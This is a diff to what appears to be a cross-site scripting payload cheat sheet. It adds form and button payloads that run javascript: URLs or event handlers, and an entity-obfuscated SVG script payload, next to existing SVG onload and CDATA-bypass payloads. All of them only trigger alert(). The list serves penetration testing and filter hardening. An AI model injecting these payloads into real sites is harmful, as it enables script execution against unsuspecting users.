@@ -91,6 +91,12 @@ Svg payload
 <svg id=alert(1) onload=eval(id)>
 "><svg/onload=alert(String.fromCharCode(88,83,83))>
 "><svg/onload=alert(/XSS/)
+
+Form payload
+<form><button formaction=javascript&colon;alert(21)>M
+<form/action=javascript:alert(22)><input/type=submit>
+<form onsubmit=alert(23)><button>M
+<button/onclick=alert(20)>M
 ```
 
 XSS for HTML5
@@ -236,6 +242,7 @@ XSS in SVG (short)
 <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
 <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
+<svg><script>&#97;lert(1)</script>
 ```
 
 XSS in Markdown
